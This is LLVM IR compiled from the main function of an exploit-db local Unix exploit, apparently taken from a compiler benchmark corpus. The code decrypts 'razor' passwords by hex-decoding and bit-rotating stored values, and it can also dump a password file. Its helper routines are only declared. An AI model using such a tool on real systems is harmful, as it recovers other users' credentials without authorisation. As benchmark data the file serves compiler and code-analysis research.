; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20056.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20056.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [26 x i8] c"razor passwd to decrypt :\00", align 1
@stdin = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [5 x i8] c"%02X\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [18 x i8], align 16
  %10 = alloca [9 x i8], align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 2
  br i1 %12, label %13, label %96

13:                                               ; preds = %2
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0))
  %15 = getelementptr inbounds [18 x i8], [18 x i8]* %9, i64 0, i64 0
  %16 = load i32, i32* @stdin, align 4
  %17 = call i32 @fgets(i8* %15, i32 17, i32 %16)
  %18 = getelementptr inbounds [18 x i8], [18 x i8]* %9, i64 0, i64 0
  %19 = call i32 @strlen(i8* %18)
  %20 = sub nsw i32 %19, 1
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [18 x i8], [18 x i8]* %9, i64 0, i64 %21
  store i8 0, i8* %22, align 1
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  br label %23

23:                                               ; preds = %27, %13
  %24 = load i32, i32* %7, align 4
  %25 = icmp slt i32 %24, 9
  br i1 %25, label %26, label %32

26:                                               ; preds = %23
  br label %27

27:                                               ; preds = %26
  %28 = load i32, i32* %7, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %7, align 4
  %30 = sext i32 %28 to i64
  %31 = getelementptr inbounds [9 x i8], [9 x i8]* %10, i64 0, i64 %30
  store i8 0, i8* %31, align 1
  br label %23

32:                                               ; preds = %23
  %33 = getelementptr inbounds [18 x i8], [18 x i8]* %9, i64 0, i64 0
  %34 = call i32 @strlen(i8* %33)
  %35 = sub nsw i32 %34, 1
  store i32 %35, i32* %7, align 4
  br label %36

36:                                               ; preds = %74, %32
  %37 = load i32, i32* %7, align 4
  %38 = icmp sge i32 %37, 0
  br i1 %38, label %39, label %77

39:                                               ; preds = %36
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 1
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %43, label %59

43:                                               ; preds = %39
  %44 = load i32, i32* %7, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [18 x i8], [18 x i8]* %9, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = call i32 @ASCII2BIN(i8 signext %47)
  %49 = shl i32 %48, 4
  %50 = and i32 %49, 240
  %51 = load i32, i32* %7, align 4
  %52 = sdiv i32 %51, 2
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [9 x i8], [9 x i8]* %10, i64 0, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = or i32 %56, %50
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  br label %71

59:                                               ; preds = %39
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [18 x i8], [18 x i8]* %9, i64 0, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = call i32 @ASCII2BIN(i8 signext %63)
  %65 = and i32 %64, 15
  %66 = trunc i32 %65 to i8
  %67 = load i32, i32* %7, align 4
  %68 = sdiv i32 %67, 2
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [9 x i8], [9 x i8]* %10, i64 0, i64 %69
  store i8 %66, i8* %70, align 1
  br label %71

71:                                               ; preds = %59, %43
  %72 = load i32, i32* %8, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %8, align 4
  br label %74

74:                                               ; preds = %71
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, -1
  store i32 %76, i32* %7, align 4
  br label %36

77:                                               ; preds = %36
  store i32 0, i32* %7, align 4
  br label %78

78:                                               ; preds = %89, %77
  %79 = load i32, i32* %7, align 4
  %80 = getelementptr inbounds [9 x i8], [9 x i8]* %10, i64 0, i64 0
  %81 = call i32 @strlen(i8* %80)
  %82 = icmp slt i32 %79, %81
  br i1 %82, label %83, label %92

83:                                               ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds [9 x i8], [9 x i8]* %10, i64 0, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = call i32 @ROT8L(i8 signext %87, i32 2)
  br label %89

89:                                               ; preds = %83
  %90 = load i32, i32* %7, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %7, align 4
  br label %78

92:                                               ; preds = %78
  %93 = getelementptr inbounds [9 x i8], [9 x i8]* %10, i64 0, i64 0
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0), i8* %93)
  %95 = call i32 @exit(i32 0) #3
  unreachable

96:                                               ; preds = %2
  %97 = load i8**, i8*** %5, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 1
  %99 = load i8*, i8** %98, align 8
  %100 = load i32, i32* @O_RDONLY, align 4
  %101 = call i32 @open(i8* %99, i32 %100)
  store i32 %101, i32* %6, align 4
  %102 = load i32, i32* %6, align 4
  %103 = icmp slt i32 %102, 0
  br i1 %103, label %104, label %129

104:                                              ; preds = %96
  store i32 0, i32* %7, align 4
  br label %105

105:                                              ; preds = %124, %104
  %106 = load i32, i32* %7, align 4
  %107 = load i8**, i8*** %5, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 1
  %109 = load i8*, i8** %108, align 8
  %110 = call i32 @strlen(i8* %109)
  %111 = icmp slt i32 %106, %110
  br i1 %111, label %112, label %127

112:                                              ; preds = %105
  %113 = load i8**, i8*** %5, align 8
  %114 = getelementptr inbounds i8*, i8** %113, i64 1
  %115 = load i8*, i8** %114, align 8
  %116 = load i32, i32* %7, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %115, i64 %117
  %119 = load i8, i8* %118, align 1
  %120 = call i64 @ROT8R(i8 signext %119, i32 2)
  %121 = trunc i64 %120 to i8
  %122 = zext i8 %121 to i32
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i32 %122)
  br label %124

124:                                              ; preds = %112
  %125 = load i32, i32* %7, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %7, align 4
  br label %105

127:                                              ; preds = %105
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  br label %132

129:                                              ; preds = %96
  %130 = load i32, i32* %6, align 4
  %131 = call i32 @dumpfile(i32 %130)
  br label %132

132:                                              ; preds = %129, %127
  %133 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fgets(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @ASCII2BIN(i8 signext) #1

declare dso_local i32 @ROT8L(i8 signext, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i64 @ROT8R(i8 signext, i32) #1

declare dso_local i32 @dumpfile(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
